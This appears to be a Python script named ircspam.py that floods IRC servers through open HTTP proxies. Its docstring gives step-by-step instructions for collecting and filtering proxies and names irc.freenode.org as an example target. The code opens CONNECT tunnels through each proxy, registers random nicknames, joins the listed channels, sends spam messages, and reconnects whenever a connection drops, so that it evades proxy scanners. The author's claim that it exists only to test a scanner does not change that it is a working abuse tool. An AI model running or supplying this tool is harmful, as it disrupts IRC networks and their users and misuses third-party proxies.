""" 
    Name: ircspam.py
    Description: This is script is used to flood ircservers using proxies. Irc servers
    that have a proxy scanner might not be able to hold the storm of proxies
    consequently some proxies pass and spam over channels.
    In order to have a nice performance you should filter proxies
    for http protocol using the check_proxy.py program with http protocol
    as default. Notice that you need to run dummy.py in order to have
    check_proxy.py running correctly. the dummy.py is a server that acts like an echo server.
    So, 67.164.8.83 8000 are playing the role of your ip and port, the port that you have set
    when running dummy.py.
    So, the exact sequence of steps would be.

    1) Find a site proxy(a site containing proxies)
    2) copy&paste all the proxies into a file named http
    3) run python dummy.py
    4) run  python check_proxy.py http xab 67.164.8.83 8000 123 200
       on the http. It will create files named good_http_proxy, bad_http_proxy
       timeout_http_proxy, close_http_proxy.
       Sometimes it might occur of proxy servers being occupied so you might
       have good http proxies inside bad_http_proxies and close_http_proxies
       it is good idea to double check by just adding the bad_http_proxies
       to the close_http_proxies with 
       echo '' > http
       cat bad_http_proxy >> http
       cat close_http_proxy >> http
       then run 
       python check_proxy.py http http 67.164.8.83 8000 123 100
       again it will double check that the 'bad' and 'close' aren't really proxies
       and eventually they will append good proxies to the good_http_proxy file.
    Obs: This script attempts to keep the connections alive. So, if one of the
    connections get closed it attempts to reconnect. It might be interesting
    to not run it with so many proxies otherwise you can run out of file descriptors
    that isn't much of an issue though it would just show an exception that is
    harmless.
    This script was made on the purpose of testing my irc scanner so
    i dont encourage people using it for non pacific means.
    Of course, to run this script you need to have proxscan installed and untwisted too.
    Usage:
    python ircspam.py good_http_proxy irc.freenode.org 8000 "#chan_1 #chan_2 ..." "msg"
"""

from proxscan import *
from string import ascii_letters as letters
from random import sample
import sys

MAX_WORD_LENGTH = 4
script, source, target_ip, target_port, chan_list, msg = sys.argv
REQUEST_HTTP = 'CONNECT %s:%s HTTP/1.0\r\n\r\n' % (target_ip, target_port)

chan_list = chan_list.split(' ')

index = 0

def get_word():
    return ''.join(sample(letters, MAX_WORD_LENGTH))

def set_fire():
    database = load_data(source)

    def set_up_con(con, nick, user):
        global chan_list
        global msg
        Stdout(con)
        Stdin(con)
        #Shrug(con)
 
        con.dump(REQUEST_HTTP)
        #yield hold(con, DUMPED)
        con.dump('NICK %s\r\n' % nick)
        con.dump('USER %s\r\n' % user)


        for ind in chan_list:
            con.dump('JOIN %s\r\n' % ind)
            con.dump('PRIVMSG %s :%s\r\n' % (ind, msg))
        
    def create_tunnel(ip, port):
        global index

        sock = socket(AF_INET, SOCK_STREAM)
        con = Spin(sock)
        Client(con)
    
        #xmap(con, FOUND, lambda con, data: sys.stdout.write('%s\n' % data))
       
        nick = '%s%s' % (get_word(), index)
        user = '%s %s %s :%s' % (get_word(), 
                                 get_word(), 
                                 get_word(), 
                                 get_word())


        xmap(con, CONNECT, set_up_con, nick, user)
        xmap(con, CLOSE, lose)
        xmap(con, CONNECT_ERR, lose)
        loop = lambda con: create_tunnel(ip, port)
        xmap(con, CONNECT_ERR, loop)
        xmap(con, CLOSE, loop)
        con.connect_ex((ip, port)) 
        index = index + 1

    for ind in database:
        ip, port = ind.group('ip', 'port')
        create_tunnel(ip, int(port))

if __name__ == '__main__':
    set_fire()
    gear.mainloop()
